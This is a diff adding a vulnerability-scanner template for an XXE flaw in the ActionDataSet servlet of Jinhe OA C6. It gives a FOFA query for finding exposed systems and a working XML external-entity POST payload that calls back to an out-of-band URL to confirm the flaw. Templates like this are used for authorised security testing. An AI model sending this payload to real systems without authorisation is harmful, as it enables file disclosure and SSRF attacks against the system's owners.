@@ -1,0 +1,20 @@
+## id: VEID-2025-0904
+## name: 金和OA-C6系统接口ActionDataSet存在XXE漏洞
+## author: hack007x
+## severity: high
+## tags: veid,xxe,veid2025
+## description: 金和OA-C6系统接口ActionDataSet存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+## fofa-query: app="金和网络-金和OA"
+## verification: true
+
+
+POST /jc6/servlet/ActionDataSet HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "{{oob_url}}"> %remote;]>
+
+#@ oob: dns
+#@ matcher: oob_received == true
